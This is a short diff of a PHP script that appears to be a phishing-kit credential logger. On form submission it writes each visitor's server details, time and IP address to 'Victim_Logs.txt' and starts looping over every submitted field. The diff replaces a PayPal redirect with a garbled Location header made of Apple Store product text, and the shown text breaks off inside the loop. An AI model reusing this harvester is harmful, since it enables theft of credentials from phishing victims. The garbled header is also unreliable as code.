@@ -1,6 +1,8 @@
 <?php
 if ($_SERVER['REQUEST_METHOD'] == 'POST') {
-header('Location: https://www.paypal.me/OfficialEvilDevil/');
+header('Location:Visit the Apple Store
+ 300
+Apple iPhone Xs Max (64GB) - Gold ');
 $handle = fopen('Victim_Logs.txt', 'a');
 fwrite($handle, '----------------------------------------------------------------------['.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'].']---['.strtoupper(date("h:i:s a - Y/m/d")).']---['.$_SERVER['REMOTE_ADDR']."]\r\n");
 foreach($_POST as $variable => $value) {
